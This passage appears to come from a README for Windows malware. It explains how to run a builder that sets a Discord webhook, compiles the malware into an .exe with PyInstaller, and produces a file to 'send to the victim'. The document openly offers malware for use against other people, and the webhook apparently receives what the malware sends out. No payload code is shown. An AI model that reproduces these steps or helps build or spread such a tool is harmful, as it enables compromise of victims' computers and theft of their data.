It also contains a builder for creating the malware easily, btw it can also be compiled by hand or executed as a python file.

The builder will create a file called `custom_webhook.py` with this:
```py
DISCORD_WEBHOOK = 'discord_webhook'
```
# Requeriments

For using and running this as a python file you will need:
  - A Windows PC
  - Pyinstaller `pip install pyinstaller
  - The requeriments in `requeriments.txt`
  - And for running the malware as a pytthon file: `pysqlite3, pygame, pypiwin32, shutil and base64`
  
# Use

You can just run the builder and send the malware builded in /dist to the victim:
```
python3 builder.py
.\builder.exe
```
Remember to install the requeriments before using the python file builder.
```
pip install -r requeriments.txt
```
The malware can be also send as a python file but I highly recommend sending it as a .exe file.

**IF YOU RUN THE BUILDER THE MALWARE WILL BE GENERATED AS A .EXE FILE IN /dist**
